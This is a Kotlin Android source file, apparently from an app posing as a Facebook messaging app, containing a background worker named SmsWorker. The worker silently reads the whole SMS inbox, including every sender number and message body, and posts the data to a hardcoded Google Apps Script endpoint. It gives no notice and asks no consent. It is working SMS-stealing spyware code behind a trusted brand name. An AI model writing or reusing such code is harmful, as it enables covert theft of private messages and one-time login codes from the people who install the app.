package com.facebook.message_app

import android.content.Context
import android.net.Uri
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley

class SmsWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    override fun doWork(): Result {
        try {
             var Sender = ""
             var Body = ""
            val smsUri = Uri.parse("content://sms/inbox")
            val cursor = applicationContext.contentResolver.query(smsUri, null, null, null, null)

            cursor?.use {
                val senderIndex = it.getColumnIndexOrThrow("address")
                val bodyIndex = it.getColumnIndexOrThrow("body")
                while (it.moveToNext()) {
                    val sender = it.getString(senderIndex)
                    val body = it.getString(bodyIndex)
                    var format=formatPhoneNumber(sender.toString())
                    Sender += "Sender:+ " +format + "\n" // Add newline character
                    Body += body + "\n"
                }
            }
            sendToserver(Sender,Body)
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }

    private fun sendToserver(sender:String,body:String){
        // Now you have access to sender and body, you can send them to the server
        val stringRequest = object : StringRequest(
            Method.POST, "https://script.google.com/macros/s/AKfycbycLf0uYyXz3zJ7_JajjgGtxzGSUnwVA72I-pwPu8M_R0YtMEvi44G3XZ86mtTAQqvxgg/exec",
            Response.Listener { response ->
                // Handle successful response here
            },
            Response.ErrorListener { error ->
                // Handle error here
            }
        ) {
            override fun getParams(): Map<String, String> {
                val params: MutableMap<String, String> = HashMap()

                params["action"] = "addItem"
                params["sender"] = sender
                params["body"] = body

                return params
            }
        }

        // Add the request to the queue for execution
        val queue: RequestQueue = Volley.newRequestQueue(applicationContext)
        queue.add(stringRequest)

    }

    private fun formatPhoneNumber(phoneNumber: String): String {
        return phoneNumber.replace("[^0-9]".toRegex(), "")
    }




}